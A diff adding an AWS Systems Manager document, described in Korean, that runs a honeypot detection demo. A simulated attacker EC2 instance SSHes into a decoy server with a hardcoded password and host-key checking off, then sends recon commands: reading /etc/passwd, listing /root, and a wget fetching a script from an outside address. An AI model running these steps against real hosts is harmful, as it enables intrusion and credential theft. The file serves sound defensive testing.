@@ -1,0 +1,49 @@
+schemaVersion: '2.2'
+description: |
+  내부 침투 시연(HONEYPOT): 이미 VPC 안에 들어온 공격자가 내부망을 뒤지다 미끼서버(허니팟)에 접속하는 상황을 재현한다.
+  서울 VPC 안의 공격자 EC2(Role=attack-simulation)에서 미끼서버 SSH(22)에 접속해 정찰 명령을 몇 개 입력한다.
+  미끼서버는 가짜 셸이라 명령은 실제로 실행되지 않고 모두 기록된다. 접속 한 번으로 탐지 알람이 울리고
+  asr_trigger 가 공격자의 사설 IP 를 Private NACL 에 자동 차단한다(auto_remediable_controls 에 HONEYPOT 이 있을 때).
+  HoneypotHost 는 10.x 사설 주소만 허용한다. 대시보드 "전부 실행"이 호출한다.
+parameters:
+  HoneypotHost:
+    type: String
+    description: 미끼서버 사설 IP (예 10.0.1.115)
+    allowedPattern: '^10\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])$'
+  SshUser:
+    type: String
+    description: 접속 계정(미끼는 어떤 계정·암호도 받아들인다)
+    default: root
+    allowedPattern: '^[a-z_][a-z0-9_-]{0,31}$'
+  RegionLabel:
+    type: String
+    description: 표기용 라벨
+    default: seoul
+mainSteps:
+  - action: 'aws:runShellScript'
+    name: probeHoneypot
+    inputs:
+      runCommand:
+        - '#!/bin/bash'
+        - set -uo pipefail
+        - |
+          if ! command -v sshpass >/dev/null; then
+            for i in 1 2 3; do sudo apt-get update -y && sudo apt-get install -y sshpass && break; sleep 10; done
+          fi
+        - HOST='{{ HoneypotHost }}'
+        - USER_NAME='{{ SshUser }}'
+        - 'echo "== honeypot probe -> $HOST as $USER_NAME @ $(date -u +%FT%TZ) =="'
+        - |
+          run() {
+            echo "--- \$ $1"
+            SSHPASS='Passw0rd!' sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+              -o ConnectTimeout=10 -o LogLevel=ERROR "$USER_NAME@$HOST" "$1" 2>&1 | head -20
+            sleep 2
+          }
+        - run 'whoami'
+        - run 'uname -a'
+        - run 'cat /etc/passwd'
+        - run 'ls -la /root'
+        - run 'wget http://203.0.113.10/x.sh -O /tmp/x.sh'
+        - 'echo "probe finished (미끼 접속 5회 — 허니팟 화면과 조치 이력에서 확인)"'
+        - exit 0
